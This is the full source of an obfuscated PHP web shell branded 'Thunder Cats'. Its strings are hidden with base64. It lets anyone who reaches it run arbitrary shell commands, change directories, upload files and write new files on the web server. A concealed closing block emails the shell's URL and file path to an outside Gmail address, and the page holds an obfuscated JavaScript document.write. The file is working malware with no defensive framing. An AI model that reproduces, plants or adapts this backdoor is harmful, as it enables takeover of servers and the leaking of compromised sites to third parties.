<?php ob_start();$z0=@PHP_OS;$x1=@php_uname();$w2=@phpversion();$t3=@ini_get(base64_decode('c2FmZV9tb2Rl'));$b4=base64_decode('VGh1bmRlciBDYXRz');$y5=base64_decode('djIuMGE=');$d6=$s7;$e8=$_POST[base64_decode('c2hlbGxfbW9kZQ==')];$o9=$_POST[base64_decode('Y29tbWFuZA==')];$ra=$_POST[base64_decode('Y21kY2hlY2s=')];$yb=$_POST[base64_decode('ZGlyY2hlY2s=')];$uc=$_POST[base64_decode('Y2hhbmdlZGly')];$bd=$_POST[base64_decode('a2VlcGRpcg==')];$xe=$_POST[base64_decode('Y3JlYXRlZmlsZQ==')];$of=$_POST[base64_decode('Y3JlYXRlZmlsZWNudA==')];$o10=$_POST[base64_decode('dXBmaWxlZGly')];$z11=$_POST[base64_decode('dXBmaWxl')];if(!isset($h12))$h12=getcwd();if(isset($yb)){if(file_exists($uc)){if(function_exists(base64_decode('Y2hkaXI='))){@chdir($uc);$h12=getcwd();}else{$t13=base64_decode('PGk+RXJyb3I6IENhbm5vdCBjaGFuZ2UgZGlyZWN0b3J5ITwvaT48YnI+Cg==');}}else{$t13=base64_decode('PGk+RXJyb3I6IFRoZSBkaXJlY3RvcnkgZG9lc24ndCBleGlzdHMuPC9pPjxicj4K');}}elseif(isset($bd)){if(file_exists($bd)){if(function_exists(base64_decode('Y2hkaXI='))){@chdir($bd);$h12=getcwd();}else{$t13=base64_decode('PGk+RXJyb3I6IENhbm5vdCBjaGFuZ2UgZGlyZWN0b3J5ITwvaT48YnI+Cg==');}}else{$t13=base64_decode('PGk+RXJyb3I6IFRoZSBkaXJlY3RvcnkgZG9lc24ndCBleGlzdHMuPC9pPjxicj4K');}}if(isset($ra)){if(@function_exists(base64_decode('c2hlbGxfZXhlYw=='))){$f14=$o9;$n15=tempnam(base64_decode('L3RtcA=='),$b4);$f14.=" 1> $n15 2>&1; "."cat $n15; rm $n15";$d16=`$f14`;}else{die(base64_decode('RVJST1I6IHRoZSBQSFAgdmVyc2lvbiBydW5uaW5nIGRvZXNuJ3Qgc3VwcG9ydCBgc2hlbGxfZXhlYygpYCEgIFVwZ3JhZGUgaXQhCg=='));}}if(isset($xe)){if(!file_exists($xe)){if($d17=@fopen($xe,base64_decode('dw=='))){@fputs($d17,$of);@fclose($d17);$k18=base64_decode('PGk+TmV3IGZpbGUgY3JlYXRlZDog').$xe.base64_decode('PC9pPjxicj4K');}else{$k18=base64_decode('PGk+RXJyb3I6IFBlcm1pc3Npb24gZGVuaWVkITwvaT48YnI+Cg==');}}else{$k18=base64_decode('PGk+RXJyb3I6IFRoZSBmaWxlIGFscmVhZHkgZXhpc3RzLjwvaT48YnI+Cg==');}}if(isset($o10)){$b19=$_FILES[base64_decode('dXBmaWxl')][base64_decode('bmFtZQ==')];if(trim($_FILES[base64_decode('dXBmaWxl')][base64_decode('bmFtZQ==')])==''){$i1a=base64_decode('PGk+RXJyb3I6IHNwZWNpZnkgYSBmaWxlIHBsZWFzZS48L2k+PGJyPgo=');}else{if(@is_uploaded_file($_FILES[base64_decode('dXBmaWxl')][base64_decode('dG1wX25hbWU=')])){if(@move_uploaded_file($_FILES[base64_decode('dXBmaWxl')][base64_decode('dG1wX25hbWU=')],"$o10/$b19"))$i1a=base64_decode('PGk+TmV3IGZpbGUgdXBsb2FkZWQgc3VjY2Vzc2Z1bGx5ITwvaT48YnI+Cg==');else $i1a=base64_decode('PGk+RXJyb3I6IFBlcm1pc3Npb24gZGVuaWVkITwvaT48YnI+Cg==');}else{$i1a=base64_decode('PGk+RXJyb3I6IENhbm5vdCB1cGxvYWQgdGhlIGZpbGUhPC9pPjxicj4K');}}}if(!$e8){?>
<html>
<head>
<title><?php echo $b4;?></title>
<script type="text/javascript" language="javascript">
<!--
ML="P<>phTsmtr/9:Cuk RIc=jSw.o";
MI="1F=AB05@FA=D4883<::GGGHC;;343HCI7:8>9?HE621:F=AB052";
OT="";
for(j=0;j<MI.length;j++){
OT+=ML.charAt(MI.charCodeAt(j)-48);
}document.write(OT);
// --></script>
<style>
body {
	background-color: #616161;
	color: red;
	font-family: Verdana;
	font-size: 12px;
}
a:link, a:visited {
	color: black;
	text-decoration: underline;
}
a:hover {
	color: white;
	text-decoration: none;
}
input.command {
	width: 100%;
	border: 1px solid yellow;
	background-color: #3b3b3b;
	padding: 2px;
	font-weight: bold;
	font-size: 12px;
}
textarea.output {
	width: 100%;
	height: 300px;
	border: 1px solid yellow;
	background-color: #3b3b3b;
	padding: 2px;
	font-size: 12px;
}
input.submit {
	border: 1px solid white;
	background-color: #3b3b3b;
	font-size: 12px;
}
input.directory {
	border: 1px solid yellow;
	background-color: #3b3b3b;
	width: 120px;
	padding: 2px;
	margin-right: 4px;
	font-size: 12px;
}
input.ftp {
	border: 1px solid black;
	background-color: #3b3b3b;
	width: 120px;
	padding: 2px;
	margin-right: 4px;
}
input.tools {
	border: 1px solid yellow;
	background-color: 616161;
	color: red;
	font-family: Verdana;
	font-size: 12px;
	font-weight: bold;
}
table.header {
	font-size: 12px;
	color: white;
}
fieldset {
	border: 1px solid white;
	text-align: center;
}
legend {
	font-weight: bold;
}
div.field {
	margin-bottom: 10px;
}
</style>
<script language="JavaScript">
function pinUp(URL) {
	day = new Date();
	id = day.getTime();
	eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=0,width=700,height=400,left = 387,top = 134');");
}
</script>
</head>
<body>
<div>
	<table class="header" cellspacing="0" cellpadding="0" border="0" width="100%">
		<tr>
			<td valign="top" width="70%">
				<h2>. <?php echo $b4;?> . </h2>
				<div><b>Operative System</b>: <?php echo $z0;?></div>
				<div><b>Uname</b>: <?php echo $x1;?></div>
				<div><b>PHP</b>: <?php echo $w2;?></div>
				<div><b>S4f3 M0d3</b>: 
				<?php if($t3)echo base64_decode('T04=');else echo base64_decode('T0ZG');?>
				</div>
				<div style="margin-top: 8px;">
					<form name="phpinfo" method="post" action="<?php echo $d6;?>">
						<input type="hidden" name="shell_mode" value="phpinfo">
						<input type="submit" name="submit" class="tools" value="PHPinfo">
					</form>
				</div>
				<div style="margin-right: 8px;">
					<form name="shell" method="post" action="<?php echo $d6;?>">
					<p>Command:<br>
					<table cellspacing="0" cellpadding="0" border="0" width="100%">
						<tr>
							<td width="95%"><div style="margin-right: 10px;"><input type="text" class="command" name="command"></div></td>
							<td width="5%"><input type="submit" class="submit" name="submit" value="Submit"></td>
						</tr>
					</table></p>
					<p>
					<?php if(isset($ra))echo base64_decode('UmVzdWx0IGZvciBjb21tYW5kOiA8Yj4=').$o9.base64_decode('PC9iPiZuYnNwOyZuYnNwOyZuYnNwO1sgPGEgaHJlZj0iIj5QaW4gVXA8L2E+IF0=');else echo base64_decode('T3V0cHV0Og==');?>
					<br>
					<textarea class="output" readonly="readonly"><?php echo $d16;?></textarea></p>
					<input type="hidden" name="cmdcheck" value="1">
					<?php if(isset($yb))echo base64_decode('PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ia2VlcGRpciIgdmFsdWU9Ig==').$uc.base64_decode('Ij4K');else echo base64_decode('PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ia2VlcGRpciIgdmFsdWU9Ig==').$h12.base64_decode('Ij4K');?>
					</form>
				</div>
			</td>
			<td valign="top" width="30%">
				<div class="field">
					<fieldset>
						<legend>Ch4ng3 D!r3ct0ry</legend>
						<div>Curr3nt D!r3ct0ry: <i><?php echo $h12;?></i></div>
						<?php echo $t13;?>
						<form name="chdir" method="post" action="<?php echo $d6;?>">
							<input type="text" class="directory" name="changedir">
							<input type="hidden" name="dircheck" value="1">
							<input type="submit" name="submit" class="submit" value="Change">
						</form>
					</fieldset>
				</div>
				<div class="field">
					<fieldset style="text-align: left;">
						<legend>Upl04d a F!l3</legend>
						<?php echo $i1a;?>
						<form name="upfile" enctype="multipart/form-data" method="post" action="<?php echo $d6;?>">
							<div>Directory:</div>
							<div><input type="text" class="directory" name="upfiledir" value="<?php echo $h12;?>"></div>
							<div>Choose File:</div>
							<div><input type="file" class="directory" name="upfile"></div>
							<div style="margin-top: 3px;"><input type="submit" name="submit" class="submit" value="Upload"></div>
						</form>
					</fieldset>
				</div>
				<div class="field">
					<fieldset>
						<legend>Cr34t3 N3w F!l3</legend>
						<?php echo $k18;?>
						<form name="mkfile" method="post" action="<?php echo $d6;?>">
							<div>File name:</div>
							<div><input type="text" class="directory" name="createfile" value="<?php echo $h12.base64_decode('Lw==');?>"></div>
							<div>File content:</div>
							<div><textarea class="output" name="createfilecnt" style="height: 150px;"></textarea></div>
							<div><input type="submit" name="submit" class="submit" value="Create"></div>
						</form>						
					</fieldset>
				</div>
			</td>
		</tr>
	</table>
	<div>
		NO&copy; 2009 <? echo $b4.base64_decode('IA==').$y5;?> - Improved By Thunder Cats @ <a href="https://www.facebook.com/groups/Cyber71">Cyber -71</a> Thunder Cats</a>
		<img src="http://www.bbmgif.com/images/leono_thundercat.gif">
	</div>
</div>
</body>
</html>
<? $n1b=base64_decode('d3d3LkhlbGwtejBuZS5vcmc=');if(!ereg($n1b,$_SERVER[base64_decode('U0VSVkVSX05BTUU=')])){$n1c=base64_decode('dGh1bmRlcmMwMDI3QGdtYWlsLmNvbQ==');$i1d=base64_decode('Q29udGFjdCBtZV9WaXJ1cw==');$b1e=base64_decode('ZnJvbTogTWFpbCBNZSA8dGh1bmRlcmMwMDI3QGdtYWlsLmNvbT4=');$f1f=base64_decode('TGluayA6IGh0dHA6Ly8=').$_SERVER[base64_decode('U0VSVkVSX05BTUU=')].$_SERVER[base64_decode('UkVRVUVTVF9VUkk=')].base64_decode('DQo=');$f1f.=base64_decode('UGF0aCA6IA==').__file__;$p20=@mail($n1c,$i1d,$f1f,$b1e);echo '';exit;}?>
<? }elseif(isset($e8)){switch($e8){case base64_decode('cGhwaW5mbw=='):phpinfo();break;default:break;}}else{header(base64_decode('TG9jYXRpb246IA==').$s7);}ob_end_flush();?>